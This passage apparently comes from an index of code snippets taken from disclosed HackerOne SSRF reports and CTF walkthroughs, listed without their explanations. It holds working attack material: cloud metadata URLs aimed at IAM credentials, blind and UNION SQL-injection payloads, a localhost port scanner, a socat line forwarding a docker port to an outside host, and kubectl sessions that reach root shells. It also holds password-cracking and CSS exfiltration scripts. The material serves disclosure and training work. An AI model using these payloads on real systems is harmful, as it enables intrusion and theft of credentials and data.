eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=
```

## 76. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```json
{
    "account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/&disregard=",
    "hash":"de235bffd23df6995ad4e0930baac1a2"
}
```

## 77. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```json
{
    "account_id": "../../redirect?url=https://software.bountypay.h1ctf.com/FUZZ&disregard=",
    "hash": "de235bffd23df6995ad4e0930baac1a2"
}
```

## 78. [#374737](https://hackerone.com/reports/374737)  -  Blind SSRF on errors.hackerone.net due to Sentry misconfiguration
*low, $3,500*

```http
POST /api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
```

## 79. [#374737](https://hackerone.com/reports/374737)  -  Blind SSRF on errors.hackerone.net due to Sentry misconfiguration
*low, $3,500*

```http
POST /api/30/store/?sentry_version=7&sentry_client=raven-js%2F3.25.2&sentry_key=61c1e2f50d21487c97a071737701f598
```

## 80. [#925527](https://hackerone.com/reports/925527)  -  Blind HTTP GET SSRF via website icon fetch (bypass of pull#812)
*low*

```
root@2efebadd421d:/app# perl -MIO::Socket::INET -ne 'BEGIN{$l=IO::Socket::INET->new( LocalPort=>80,Proto=>"tcp",Listen=>5,ReuseAddr=>1); my $l=$l->accept(); while(<$l>){ print $_; }; close($l);}'
GET /PATH_IS_KEPT HTTP/1.1
Host: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299
Accept-Language: en-US, en; q=0.8
Cache-Control: no-cache
Pragma: no-cache
Accept: text/html, application/xhtml+xml, application/xml; q=0.9, image/webp, image/apng, */*; q=0.8
Request-Id: |3d01319c-4dccd9dac66f3032.3.
Accept-Encoding: gzip, deflate

^C
root@2efebadd421d:/app#
```

## 81. [#783392](https://hackerone.com/reports/783392)  -  SSRF in img.lemlist.com that leads to Localhost Port Scanning
*medium*

```javascript
async scanChromeLinux(iframe, a) {
    var that = this;
    let promise = new Promise(function(resolve, reject){
        that.hooks = {oncomplete:function(){
          document.body.removeChild(iframe);
          resolve();
        }};
        that.scan = function() {
            var port = that.q.shift(), calls = 0, timer;
            iframe.src = that.url + ":" + port;
            a.href = iframe.src + '#';
            that.updateProgress(port);
            iframe.hasLoadedOnce = 0;
            iframe.onload = function(){
                calls++;
                if(calls > 1) {
                  clearTimeout(timer);
                  that.next();
                  return;
                }
                iframe.hasLoadedOnce = 1;
                a.click();
            };
            timer = setTimeout(function(){
              if(iframe.hasLoadedOnce) {
                that.openPorts.push(port);
              }
              that.next();
            }, 500 ); // <-- CHANGE THAT VALUE
        };
        that.scan();
    });
    return promise;
  }
```

## 82. [#855276](https://hackerone.com/reports/855276)  -  Injection of `http.<url>.*` git config settings leading to SSRF
*high, $3,000*

```bash
curl -H "Authorization: Bearer $TOKEN" -v 'http://gitlab-vm.local/api/v4/projects/204' | jq .import_error`
"2:Fetching remote upstream failed: remote: method GET not allowed\nfatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405\n"
```

## 83. [#3634400](https://hackerone.com/reports/3634400)  -  SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)
*high*

```bash
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'cat > /tmp/vuln_server_nat64.rb << "RUBY"
require "socket"
server = TCPServer.new("64:ff9b:1::7f00:1", 18081)
loop do
  sock = server.accept
  begin
    while (line = sock.gets)
      break if line == "\r\n"
    end
    body = "NAT64_PREFIX_BYPASS_DEMO"
    sock.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: #{body.bytesize}\r\nConnection: close\r\n\r\n#{body}")
  ensure
    sock.close rescue nil
  end
end
RUBY
nohup ruby /tmp/vuln_server_nat64.rb >/tmp/vuln_server_nat64.log 2>&1 &'
```

## 84. [#3634400](https://hackerone.com/reports/3634400)  -  SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)
*high*

```bash
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'
{"status":"blocked","error":"SsrfFilter::PrivateIPAddress","message":"Hostname '64:ff9b::7f00:1' has no public ip addresses"}%
```

## 85. [#3165242](https://hackerone.com/reports/3165242)  -  Server-Side Request Forgery (SSRF) via Game Export API
*critical*

```
http://169.254.169.254/latest/meta-data/
```

## 86. [#781295](https://hackerone.com/reports/781295)  -  [h1-415 2020] SSRF in a headless chrome with remote debugging leads to sensible information leak
*critical*

```html
<script type="text/javascript" src="https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fAjay-Aj-00/Test/master/final.js"></script>
```

## 87. [#781295](https://hackerone.com/reports/781295)  -  [h1-415 2020] SSRF in a headless chrome with remote debugging leads to sensible information leak
*critical*

```html
<script src="https://8a7b2695.ngrok.io/static/js/new.js"></script>
```

## 88. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```
' OR 1=1-- `. If we are lucky, the server will p
```

## 89. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```
' OR 1=1-- '
```

## 90. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```
' OR 1=1-- You Scored
```

## 91. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Content-Type: application/json" --data '{"items": [{"key": "0xACB", "value": "test"}]}'
```

## 92. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```bash
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████"
```

## 93. [#941178](https://hackerone.com/reports/941178)  -  SSRF for kube-apiserver cloudprovider scene
*medium*

```bash
curl -XPUT --data "10" http://localhost:8001/debug/flags/v
```

## 94. [#1553841](https://hackerone.com/reports/1553841)  -  CVE-2022-27780: percent-encoded path separator in URL host
*medium*

```bash
curl -x http://127.0.0.1:8899 http://example.com%2F127.0.0.1
```

## 95. [#1055823](https://hackerone.com/reports/1055823)  -  SSRF By adding a custom integration on console.helium.com
*high, $500*

```
http://169.254.169.254/latest/meta-data
```

## 96. [#1055823](https://hackerone.com/reports/1055823)  -  SSRF By adding a custom integration on console.helium.com
*high, $500*

```
http://169.254.169.254/latest/meta-data/ami-id
```

## 97. [#508459](https://hackerone.com/reports/508459)  -  SSRF in webhooks leads to AWS private keys disclosure
*high*

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role`
```

## 98. [#508459](https://hackerone.com/reports/508459)  -  SSRF in webhooks leads to AWS private keys disclosure
*high*

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role
```

## 99. [#541169](https://hackerone.com/reports/541169)  -  GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery
*high*

```
http://169.254.169.254/metadata/v1.json`
```

## 100. [#786956](https://hackerone.com/reports/786956)  -  Server Side Request Forgery in Uppy npm module
*high*

```
http://169.254.169.254/metadata/v1/`
```

## 101. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```java
if (getIntent() != null && getIntent().getData() != null) {
      String str = getIntent().getData().getQueryParameter("start");
      if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
        str = sharedPreferences.getString("USERNAME", "");
        SharedPreferences.Editor editor = sharedPreferences.edit();
        String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
        editor.putString("PARTONE", "COMPLETE").apply();
        logFlagFound(str, str1);
        startActivity(new Intent(this, PartTwoActivity.class));
      } 
    }
```

## 102. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```java
String firstParam = getIntent().getData().getQueryParameter("start");
if (firstParam != null && firstParam.equals("PartTwoActivity") && settings.contains(str)) {
    String str2 = "";
    String user = settings.getString(str, str2);
    Editor editor = settings.edit();
    String twitterhandle = settings.getString("TWITTERHANDLE", str2);
    editor.putString("PARTONE", "COMPLETE").apply();
    logFlagFound(user, twitterhandle);
    startActivity(new Intent(this, PartTwoActivity.class));
}
```

## 103. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```java
String value = (String) dataSnapshot.getValue();
SharedPreferences settings = PartTwoActivity.this.getSharedPreferences(PartTwoActivity.KEY_USERNAME, 0);
Editor editor = settings.edit();
String str = post;
StringBuilder sb = new StringBuilder();
sb.append("X-");
sb.append(value);
if (str.equals(sb.toString())) {
    String str2 = "";
    PartTwoActivity.this.logFlagFound(settings.getString("USERNAME", str2), settings.getString("TWITTERHANDLE", str2));
    editor.putString("PARTTWO", "COMPLETE").apply();
    PartTwoActivity.this.correctHeader();
    return;
}
Toast.makeText(PartTwoActivity.this, "Try again! :D", 0).show();
```

## 104. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```http
Putting everything together, we get: https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab3

We need the login template to have access to the username field, the ticket template to have access to our avatar (from the admin's point of view), and the tab in order to trigger our click.
```

## 105. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
Request

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))<100#

Response

There is 769468 other player(s) with the same name as you!
```

## 106. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
Request

name=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))<90#

Response

There is 0 other player(s) with the same name as you!
```

## 107. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
name=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))=97#

TRUE
```

## 108. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))>90#

TRUE

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))<100#

FALSE

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))=100#

TRUE
```

## 109. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
name =lol'+or+Ascii(substring((Select+concat(column_name)+from+information_schema.columns+where+table_name=0x61646d696e+limit+0,1),1,1))>0#
```

## 110. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' order by 4--+-","2","3"--+-    ERROR

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' order by 3--+-","2","3"--+-     Normal Reponse

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",\"3\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
```

## 111. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",database()--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/recon","auth":"015cc4ed326cfc9e314afdaf594a5ce3"}

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",version()--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/8.0.22-0ubuntu0.20.04.3","auth":"03d2bc97a58dc15c4eaf5d4fa2d9f93d"}
```

## 112. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sql
SELECT count(*) FROM users WHERE name = '' OR 1=1-- '
```

## 113. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```
' OR 1=1-- You Scored
0/3
You're not evil at all!
There is 187882 other player(s) with the same name as you!
```

## 114. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```
test' UNION SELECT 1,2,3,4 FROM users-- # Returned 0 users
```

## 115. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```
testerbtgsg54g45' union select table_schema, table_name, 1, 1 from information_schema.tables where table_name like binary '<char>%'--
```

## 116. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```html
<h1 class="text-center">select * from album where hash = 'fakehash' UNION SELECT 1,1,info from information_schema.processlist-- '</h1>
```

## 117. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sql
SELECT * FROM album WHERE hash = 'fakehash' UNION SELECT 1337, 'my_hash', 'my_album_name'-- ';
```

## 118. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sql
SELECT * FROM album WHERE hash = 'fakehash' 
UNION SELECT "1337' UNION SELECT 0, 0, 'my_photo.jpg'-- ", 'my_hash', 'my_album_name'-- ';
```

## 119. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sql
SELECT * FROM photo WHERE album_id = '1337' UNION SELECT 0, 0, 'my_photo.jpg'-- ';
```

## 120. [#324005](https://hackerone.com/reports/324005)  -  Server-Side Request Forgery on SAML Application - Import via URL
*medium, $450*

```
http://169.254.169.254/latest/meta-data/a
```

## 121. [#324005](https://hackerone.com/reports/324005)  -  Server-Side Request Forgery on SAML Application - Import via URL
*medium, $450*

```
http://169.254.169.254/latest/meta-data/a&#039;.`
```

## 122. [#793704](https://hackerone.com/reports/793704)  -  Server-Side Request Forgery (SSRF) in Ghost CMS
*medium*

```
http://169.254.169.254/metadata/v1.json&type=embed
```

## 123. [#793704](https://hackerone.com/reports/793704)  -  Server-Side Request Forgery (SSRF) in Ghost CMS
*medium*

```
http://169.254.169.254/metadata/v1.json
```

## 124. [#3608558](https://hackerone.com/reports/3608558)  -  Blind POST SSRF via Web Push Notification Endpoint
*medium*

```
http://169.254.169.254/`
```

## 125. [#689245](https://hackerone.com/reports/689245)  -  SSRF In plantuml (on plantuml.pre.gitlab.com)
*medium*

```
http://169.254.169.254/
```

## 126. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```
../../redirect?url=%s
```

## 127. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```json
{{name}}
```

## 128. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```json
{{template:38dhs_admins_only_header.html}}
```

## 129. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```
../../../../SecLists/Discovery/Web-Content/
```

## 130. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```
../../../SecLists/Passwords/Leaked-Databases/rockyou.txt
```

## 131. [#1544133](https://hackerone.com/reports/1544133)  -  SSRF vulnerability can be exploited when a hijacked aggregated api server such as metrics-server returns 30X
*medium, $1,000*

```
2022/04/16 00:30:13 src IP: 20.51.80.40:4096
GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/json, */*
Accept-Encoding: gzip
Authorization: Bearer <omitted>
User-Agent: azurepolicyaddon/v0.0.0 (linux/amd64) kubernetes/$Format

GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/vnd.kubernetes.protobuf, */*
Authorization: Bearer <omitted>
User-Agent: kube-controller-manager/v1.17.13 (linux/amd64) kubernetes/f4a8e76/system:serviceaccount:kube-system:generic-garbage-collector

2022/04/16 00:34:37 src IP: 20.69.190.88:21504
GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/json, */*
Accept-Encoding: gzip
Authorization: Bearer  <omitted>
User-Agent: cpmonitor/v0.0.0 (linux/amd64) kubernetes/$Format
```

## 132. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```bash
$ kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash

Defaulting container name to web.
Use 'kubectl describe pod/w█████████' to see all of the containers in this pod.
███████:/# id
uid=0(root) gid=0(root) groups=0(root)
█████:/# ls
app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
███████:/# exit
```

## 133. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```bash
$ kubectl --certificate-authority ca.crt --server https://███████ --token "█████.██████.█████████" exec -it ████████ -n ████████ -- /bin/bash

Defaulting container name to web.
Use 'kubectl describe pod/█████ -n █████' to see all of the containers in this pod.
root@████:/# id
uid=0(root) gid=0(root) groups=0(root)
root@████:/# ls
app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
root@█████:/# exit
```

## 134. [#793704](https://hackerone.com/reports/793704)  -  Server-Side Request Forgery (SSRF) in Ghost CMS
*medium*

```xml
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Testing</title>
    <link rel="alternate" type="application/json+oembed" href="http://169.254.169.254/metadata/v1.json"/>
</head>
<body></body>
</html>
```

## 135. [#689245](https://hackerone.com/reports/689245)  -  SSRF In plantuml (on plantuml.pre.gitlab.com)
*medium*

```
@startuml
start
    :Do some stuff;
    !include http://169.254.169.254/
stop;
@enduml
```

## 136. [#809248](https://hackerone.com/reports/809248)  -  SSRF into Shared Runner, by replacing dockerd with malicious server in Executor
*medium*

```
echo '#!/bin/sh' > /cmd
echo "sudo kill -9 999 && socat tcp-listen:2376,reuseaddr,fork tcp:1.2.3.4:1111 2> $host_path/k2" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## 137. [#776017](https://hackerone.com/reports/776017)  -  Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.
*high, $5,000*

```json
{{SC_NAME}}
```

## 138. [#776017](https://hackerone.com/reports/776017)  -  Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.
*high, $5,000*

```json
{{PVC_NAME}}
```

## 139. [#3634400](https://hackerone.com/reports/3634400)  -  SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)
*high*

```json
{{range $k,$v := .NetworkSettings.Networks}}
```

## 140. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```json
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

## 141. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```
#!/usr/bin/python3
file = open("payloads.txt","a") 
with open('dicc.txt') as fp:
   line = fp.readline()
   while line:
       url = 'https://software.bountypay.h1ctf.com/{}/#'.format(line.strip())
       l = '{"account_id":"../../redirect?url=%s","hash":"de235bffd23df6995ad4e0930baac1a2"}' % url
       file.write(l+'\n') 
       line = fp.readline()
file.close()
```

## 142. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```
Reading something about css data exfiltration, i found something who helped me and created python script.
```

## 143. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```
Sent my css url and executing python script to update it, retrieved information about field names. There is a input field for each character!!
```

## 144. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```
adding some function to my python script to retrieve the information for each field.
```

## 145. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```javascript
$('.upgradeToAdmin').click(function () {
	let t = $('input[name="username"]').val();
	$.get('/admin/upgrade?username=' + t, function () {
		alert('User Upgraded to Admin');
	});
}),
```

## 146. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

## 147. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```md
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

## 148. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```python
CHARS = "qwertyuiopasdfghjklzxcvbnm1234567890"

def exfiltrate(field):
    accumulator = ''
    while True:
        for char in CHARS:
            payload = PAYLOAD.replace('FUZZ', f'user?{field}={accumulator}{char}%')
            if process(payload, avoid_code='204'):
                accumulator += char 

sys.argv[1] == 'username' and exfiltrate('username')
sys.argv[1] == 'password' and exfiltrate('password')
```

## 149. [#1608039](https://hackerone.com/reports/1608039)  -  SSRF via potential filter bypass with too lax local domain checking
*low, $250*

```php
// Disallow hostname only
		if (substr_count($host, '.') === 0 && !(bool)filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
			$this->logger->warning("Host $host was not connected to because it violates local access rules");
			throw new LocalServerException('Host violates local access rules');
		}
```

## 150. [#429617](https://hackerone.com/reports/429617)  -  Reverse Proxy misroute leading to steal X-Shopify-Access-Token header
*medium, $1,000*

```
${HTTP_Host}
```

## 151. [#826361](https://hackerone.com/reports/826361)  -  SSRF on project import via the remote_attachment_url on a Note
*high, $10,000*

```ruby
def remote_urls=(urls)
      return if not urls or urls == "" or urls.all?(&:blank?)

      @remote_urls = urls
      @download_error = nil
      @integrity_error = nil

      @uploaders = urls.zip(remote_request_headers || []).map do |url, header|
        uploader = blank_uploader
        uploader.download!(url, header || {})
        uploader
      end
```

## 152. [#776017](https://hackerone.com/reports/776017)  -  Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.
*high, $5,000*

```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
name: {{SC_NAME}}
provisioner: kubernetes.io/glusterfs
parameters:
resturl: "http://{{URL}}#"
clusterid: "630372ccdc720a92c681fb928f27b53f"
restauthenabled: "true"
restuser: "admin"
secretNamespace: "default"
secretName: "heketi-secret"
gidMin: "40000"
gidMax: "50000"
volumetype: "replicate:3"
```

## 153. [#776017](https://hackerone.com/reports/776017)  -  Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.
*high, $5,000*

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: {{PVC_NAME}}
spec:
accessModes:
- ReadWriteOnce
volumeMode: Filesystem
resources:
requests:
storage: 8Gi
storageClassName: {{SC_NAME}}
```

## 154. [#1746582](https://hackerone.com/reports/1746582)  -  Mail app - blind SSRF via smtpHost parameter
*low*

```json
{{F1998975}}
```

## 155. [#783392](https://hackerone.com/reports/783392)  -  SSRF in img.lemlist.com that leads to Localhost Port Scanning
*medium*

```php
<?php
	// PHP permanent URL redirection
	header("Location: [YOUR WEBSITE]/PoC.html?i=0", true, 301);
	exit();
?>
```

## 156. [#783392](https://hackerone.com/reports/783392)  -  SSRF in img.lemlist.com that leads to Localhost Port Scanning
*medium*

```php
<?php
	// PHP permanent URL redirection
	header("Location:https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@[YOUR WEBSITE]", true, 301);
	exit();
?>
```

## 157. [#541169](https://hackerone.com/reports/541169)  -  GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery
*high*

```sh
$ gitlab-rake gitlab:env:info

System information
System:         Ubuntu 18.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.5.3p105
Gem Version:    2.7.6
Bundler Version:1.16.6
Rake Version:   12.3.2
Redis Version:  3.2.12
Git Version:    2.18.1
Sidekiq Version:5.2.5
Go Version:     unknown

GitLab information
Version:        11.9.8-ee
Revision:       c9701808101
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     postgresql
DB Version:     9.6.11
URL:            https://gitlabext.webhooks.pw
HTTP Clone URL: https://gitlabext.webhooks.pw/some-group/some-project.git
SSH Clone URL:  git@gitlabext.webhooks.pw:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        8.7.1
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## 158. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
Identifying Sql injection

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol'            Response  404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k--+-     Response 200

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k' order by  4--+-  Reponse 404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k ' order+by 3--+-   Response 200

Getting vulnerable column

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,3--+-     Response 200 and 3rd column is printed
(Please note that we need to remove original hash value to see vulnerbale column)

Trying to extract table name using the query

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,table_name+from information_schema.tables where table_schema=database()--+-
```

## 159. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```python
#!/usr/bin/python3
import hashlib 
fuzz = [line.rstrip('\n') for line in open('rockyou.txt')]
for i in fuzz:
	#{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
	  target =  i + "203.0.113.33"
	  target_hash = "5f2940d65ca4140cc18d0878bc398955"
	  generate_hash = hashlib.md5(target.encode())
	  md5 = str(generate_hash.hexdigest())
	  if target_hash == md5:
	  	print("Here's valid salt: "+i)
	  	break
```

## 160. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
Putting random default credentials resulted "Invalid Username".It look like we need to brute force to get valid username first.
```

## 161. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
Getting table
```

## 162. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
Getting username
```

## 163. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
Getting password
```

## 164. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
Getting vulnerable column

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,3--+-     Response 200 and 3rd column is printed
```

## 165. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
Putting ' in the first column and something strange happend and fix the query by comment(--+-) and got the normal response back.

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1'--+-","2","3"--+-
```

